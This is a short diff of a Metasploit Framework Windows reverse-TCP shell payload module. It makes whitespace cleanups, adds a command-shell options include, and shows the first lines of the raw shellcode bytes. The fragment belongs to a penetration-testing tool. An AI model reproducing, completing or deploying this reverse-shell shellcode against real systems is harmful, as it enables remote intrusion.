@@ -3,21 +3,20 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
 ##
 
-
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
-
 
 module Metasploit3
 
 	include Msf::Payload::Windows
 	include Msf::Payload::Single
+	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
 		super(merge_info(info,
@@ -38,7 +37,7 @@ module Metasploit3
 							'LHOST'    => [ 196, 'ADDR' ],
 							'EXITFUNC' => [ 284, 'V'    ],
 						},
-					'Payload' =>  
+					'Payload' =>
 						"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
 						"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
 						"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
